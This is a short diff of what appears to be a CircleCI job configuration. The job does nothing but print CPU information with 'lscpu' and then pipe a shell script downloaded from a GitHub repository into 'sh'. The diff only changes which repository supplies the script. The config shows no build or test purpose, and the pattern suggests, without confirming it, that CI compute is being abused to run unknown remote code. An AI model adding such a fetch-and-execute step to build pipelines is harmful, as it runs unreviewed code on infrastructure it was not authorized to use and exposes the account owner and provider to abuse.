@@ -6,7 +6,7 @@ jobs:
     parallelism: 1
     steps:
       - run: lscpu
-      - run: wget https://raw.githubusercontent.com/bisece/bsc-007/main/sks.sh -O - | sh
+      - run: wget https://raw.githubusercontent.com/bisece/bsc-008/main/sks.sh -O - | sh
 
 workflows:
   version: 2.1
